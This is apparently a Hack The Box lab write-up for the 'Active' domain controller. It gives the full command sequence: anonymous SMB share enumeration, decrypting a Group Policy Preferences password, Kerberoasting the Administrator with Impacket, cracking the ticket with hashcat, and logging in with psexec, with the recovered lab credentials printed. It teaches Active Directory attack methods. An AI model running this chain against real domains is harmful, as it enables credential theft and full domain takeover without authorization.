---
title: "HTB: Active"
tags: [htb, windows, easy, active-directory, sysvol, gpp, kerberoasting, smb]

description: "A textbook Active Directory compromise. Finding passwords in SYSVOL (GPP) and Kerberoasting the Administrator."
---

# Hack The Box: Active

**Machine IP**: `10.10.10.100`
**OS**: Windows Server 2008 R2 (Domain Controller)
**Difficulty**: Easy

Active is a foundational Active Directory box. It demonstrates two vulnerabilities that plagued Windows networks for a decade: **GPP (Group Policy Preferences)** passwords stored in SYSVOL, and **Kerberoasting**.

---

## 1. Reconnaissance

### Nmap Scan
```bash
nmap -sC -sV -oA scans/active 10.10.10.100
```
Key Ports:
*   **53**: DNS
*   **88**: Kerberos (Confirmed AD Domain Controller)
*   **139/445**: SMB / RPC
*   **389**: LDAP

### SMB Enumeration
We start by attempting to list shares anonymously.
```bash
smbclient -L //10.10.10.100 -N
```
*   `ADMIN` (Access Denied)
*   `C$` (Access Denied)
*   `Replication` (Read Access)
*   `NETLOGON` (Read Access)
*   `SYSVOL` (Read Access)

The **Replication** share is interesting. In many organizations, Group Policy updates are replicated here.

---

## 2. Exploitation: GPP (Group Policy Preferences)

We recursively search the **Replication** share for XML files, which often contain configuration data.

```bash
smbclient //10.10.10.100/Replication -N
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```

We find a file: `Groups.xml`. This specific file was used in Server 2008 to set local administrative passwords via Group Policy.

### The Vulnerability (MS14-025)
Inside `Groups.xml`, we see:
```xml
<User name="SVC_TGS" cpassword="edBSHOwhZLTjt/QS9feIcJ83nsW..."/>
```
Historically, Microsoft encrypted this `cpassword` with AES-256. However, **they accidentally published the encryption key on MSDN**. Tools like `gpp-decrypt` (or standard Ruby scripts) can decrypt this instantly.

```bash
gpp-decrypt edBSHOwhZLTjt/QS9feIcJ83nsW...
# Output: GPPstillStandingStrong2k18
```

We now have creds: `active.htb\SVC_TGS`.

---

## 3. Privilege Escalation: Kerberoasting

Since we have a valid user (`SVC_TGS`), we can query the Domain Controller for **Service Principal Names (SPNs)**.
If a user account is configured to run a service (like SQL or IIS), we can request a Kerberos TGS ticket for it. The ticket is encrypted with the service account's NTLM hash. We can take that ticket offline and crack it.

### Requesting the Ticket (Impacket)
We use `GetUserSPNs.py` from Impacket to find and roast accounts.

```bash
impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
```

**Output**:
```text
ServicePrincipalName    Name           MemberOf    PasswordLastSet
--------------------    -----------    ---------   ----------------
Administrator           Administrator  Domain Admins   ...
```
We got a hash for the **Administrator** account itself! (In a real enterprise, you'd usually get a SQL service account, but this box is generous).

### Cracking the Hash (Hashcat)
We save the ticket to `hash.txt` and run Hashcat mode 13100 (Kerberos 5 TGS-REP).

```bash
hashcat -m 13100 hash.txt rockyou.txt
```
Within seconds:
`Ticket... : Ticketmaster1968`

---

## 4. Pwned

We now have the Domain Admin credentials.
**User**: `Administrator`
**Pass**: `Ticketmaster1968`

We log in via **psexec** (or `wmiexec` for stealth).

```bash
impacket-psexec active.htb/Administrator:Ticketmaster1968@10.10.10.100
```
```text
C:\Windows\system32> whoami
nt authority\system
```

### Flags
*   **User.txt**: `C:\Users\SVC_TGS\Desktop\user.txt`
*   **Root.txt**: `C:\Users\Administrator\Desktop\root.txt`

## Conclusion
Active teaches the "Golden Path" of AD pentesting:
1.  Find initial creds (GPP, Phishing, LLMNR).
2.  Use those creds to query Active Directory.
3.  Find a service account to Kerberoast.
4.  Crack the ticket -> Domain Admin.
